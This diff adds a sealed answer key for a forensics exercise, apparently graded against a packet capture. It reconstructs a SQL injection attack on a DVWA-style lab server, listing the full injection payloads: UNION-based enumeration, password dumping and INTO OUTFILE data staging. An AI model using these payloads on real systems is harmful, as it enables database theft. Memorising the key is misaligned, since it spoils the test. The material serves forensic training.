@@ -1,0 +1,25 @@
+# SEALED GROUND TRUTH - Case 02
+- Generated packets: 203
+- Attacker 192.168.56.10 -> web server 192.168.56.30:80 (Apache/2.4.58 Debian per Server header)
+- Session A (Firefox UA) 2026-11-03 13:20:00.000Z: login with admin/password (302 + Set-Cookie), 5 requests
+- Session B (sqlmap-like UA `sqlmap/1.7.11#stable (https://sqlmap.org)`) from 2026-11-03 13:21:35.000Z: 11 injection requests on parameter `id`
+- Column count of the query = 2 (ORDER BY 2 ok, ORDER BY 3 error)
+- Staging: INTO OUTFILE to /var/www/html/dump/customers.csv (visible only as a URI; success is implied by the later download)
+- Session C (curl UA) 2026-11-03 13:22:12.874Z: GET /dump/customers.csv -> 200, text/csv, 28370 bytes
+- customers.csv sha256 = 9b44747e8edc117647021d0730dbde052c09374d15c0280308d3cd32763ca4c6
+- customers.csv md5    = 98e5d93bc6b74b21df42629bb7b03dfe
+- Total HTTP requests = 17 (5 + 11 + 1); TCP connections = 3 (client ports 52110, 52112, 52140)
+- Request log:
+  - 2026-11-03 13:20:01.005Z  GET /login.php  (body 200 B)
+  - 2026-11-03 13:20:04.210Z  POST /login.php (admin/password)  (body 302 B)
+  - 2026-11-03 13:21:35.456Z  /vulnerabilities/sqli/?id=1'&Submit=Submit  (body 4095 B)
+  - 2026-11-03 13:21:36.085Z  /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit  (body 4159 B)
+  - 2026-11-03 13:21:36.655Z  /vulnerabilities/sqli/?id=1' ORDER BY 1-- -&Submit=Submit  (body 3978 B)
+  - 2026-11-03 13:21:37.379Z  /vulnerabilities/sqli/?id=1' ORDER BY 2-- -&Submit=Submit  (body 3978 B)
+  - 2026-11-03 13:21:38.241Z  /vulnerabilities/sqli/?id=1' ORDER BY 3-- -&Submit=Submit  (body 3979 B)
+  - 2026-11-03 13:21:38.726Z  /vulnerabilities/sqli/?id=1' UNION SELECT 1,2-- -&Submit=Submit  (body 4016 B)
+  - 2026-11-03 13:21:39.342Z  /vulnerabilities/sqli/?id=1' UNION SELECT user(),database()-- -&Submit=Submit  (body 4031 B)
+  - 2026-11-03 13:21:40.199Z  /vulnerabilities/sqli/?id=1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema='dvwa'-- -&Submit=Submit  (body 4121 B)
+  - 2026-11-03 13:21:40.611Z  /vulnerabilities/sqli/?id=1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='customers'-- -&Submit=Submit  (body 4241 B)
+  - 2026-11-03 13:21:41.321Z  /vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit  (body 4345 B)
+  - 2026-11-03 13:21:42.067Z  /vulnerabilities/sqli/?id=1' UNION SELECT id,CONCAT_WS(',',first_name,last_name,email,phone,card_last4) FROM customers INTO OUTFILE '/var/www/html/dump/customers.csv'-- -&Submit=Submit  (body 3978 B)
